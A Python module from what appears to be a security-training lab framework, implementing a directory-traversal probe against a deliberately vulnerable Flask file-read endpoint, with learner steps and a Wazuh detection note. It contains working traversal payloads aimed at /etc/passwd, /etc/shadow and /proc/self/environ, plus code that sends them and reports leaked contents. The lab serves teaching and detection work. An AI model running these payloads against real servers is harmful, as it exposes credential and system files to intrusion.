"""
modules/dir_traversal.py — APP-03: Directory Traversal probe.

Target: GET /files/read?path=<payload>
Vulnerability: path concatenated to BASE_DIR without normalization.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_PAYLOADS = [
    ("relative-basic",  "../../etc/passwd"),
    ("relative-deep",   "../../../etc/shadow"),
    ("url-encoded",     "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
    ("absolute-path",   "/etc/hostname"),
    ("proc-self",       "../../proc/self/environ"),
]

_INDICATORS = ["root:", "nobody:", "www-data:", "/bin/bash", "/bin/sh", "PATH="]


class DirTraversalModule(BaseModule):
    module_id = "dir_traversal"
    name = "Directory Traversal"
    description = (
        "Path traversal attack against /files/read to access "
        "sensitive files outside the web root."
    )
    category = Category.FILE
    scenario_id = "APP-03"
    severity = Severity.HIGH
    lab = {
        "target_path": "/files/read",
        "vulnerable_component": "Flask file-read handler (files_bp.read_file)",
        "story": (
            "A legacy static-file viewer concatenates the `path` query "
            "parameter directly onto a base directory. No normalisation is "
            "performed. Prove that ../ sequences escape the web root and read "
            "arbitrary files."
        ),
        "learner_steps": [
            {"action": "Open the Document Viewer and read the default readme.txt file.",
             "expected": "You see the contents of the lab readme file."},
            {"action": "Change the path to ../../etc/passwd and read the file.",
             "expected": "/etc/passwd is displayed — entries like 'root:x:0:0:' are visible."},
            {"action": "Try URL-encoded traversal: %2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "expected": "The same file contents appear — encoding bypasses naive filters."},
            {"action": "Try reading /etc/hostname or ../../proc/self/environ",
             "expected": "System files are disclosed — path validation is absent."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "expected": "Alert matches '../' traversal patterns in the path parameter."},
        ],
        "detection_rule": "Wazuh path-traversal signature (../ in path parameter)",
        "success_markers": [
            "'root:x:0:0:' or 'www-data:' strings in the response",
            "✓ DISCLOSED in the activity log",
            "Wazuh alert on /files/read with traversal payload",
        ],
        "quick_probe": "/files/read?path=../../etc/passwd",
    }
    steps = [{'title': 'Map the file-read endpoint', 'hint': 'GET /files/read?path=readme.txt returns a benign file', 'expected': 'Baseline 200 response with file content'}, {'title': 'Traverse outside the base directory', 'hint': '../../etc/passwd, URL-encoded variants, absolute paths', 'expected': 'System file contents appear in the response body'}, {'title': 'Confirm traversal worked', 'hint': "Look for 'root:', 'www-data:', '/bin/bash' indicators", 'expected': 'Traversal confirmed with leaked /etc/passwd line'}]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="custom_path",
                display_name="Custom Path",
                description="Optional: custom path to try (e.g. '../../etc/shadow')",
                default="",
            ),
            ModuleOption(
                name="endpoint",
                display_name="File Read Endpoint",
                description="Target endpoint path",
                default="/files/read",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        endpoint = opts.get("endpoint", "/files/read")
        disclosed = 0

        payloads = list(_PAYLOADS)
        custom = opts.get("custom_path", "").strip()
        if custom:
            payloads.append(("custom", custom))

        self._log(log_fn, f"Testing {len(payloads)} traversal payloads against {endpoint}")

        for label, payload in payloads:
            url = target.base_url + endpoint
            r = self._get(url, params={"path": payload},
                          label=label, timeout=target.timeout)

            body = r.detail or ""
            hit = any(ind in body for ind in _INDICATORS)
            if hit:
                disclosed += 1
                snippet = body[:120].replace("\n", "↵")
                r.evidence = f"FILE DISCLOSED: {snippet}"
                self._log(log_fn, f"  ✓ DISCLOSED [{label}]  |  {payload}")
                self._log(log_fn, f"    snippet: {snippet}")
            else:
                self._log(log_fn, f"  – no sensitive data [{label}]  |  {payload}")

            steps.append(r)

        summary = f"{disclosed}/{len(payloads)} payloads disclosed sensitive files."
        return self._make_result(target, steps, summary, started)
